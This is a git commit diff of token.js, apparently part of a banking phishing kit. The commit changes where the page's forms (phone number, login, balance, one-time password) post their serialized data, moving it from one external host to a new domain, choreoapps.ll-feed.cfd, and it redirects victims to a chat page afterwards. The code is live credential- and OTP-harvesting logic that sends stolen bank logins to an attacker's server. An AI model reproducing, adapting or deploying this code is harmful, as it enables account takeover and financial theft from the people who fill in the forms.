d61ac1a07a6d131410ad49a2151087c5dd0a21fe
dodypribadi5 <dodypribadi5@gmail.com>
2025-02-08 20:06:44 +0700

    Update token.js

--- token.js
+++ token.js
@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/d5fd/no.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/d5fd/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/d5fd/login.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/d5fd/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/d5fd/saldo.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/d5fd/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreo.cloud/bsi/d5fd/otp.php',
+ url: 'https://choreoapps.ll-feed.cfd/bsi/d5fd/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://choreo.cloud/wa/d5fd';
+location.href='https://choreoapps.ll-feed.cfd/wa/d5fd';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
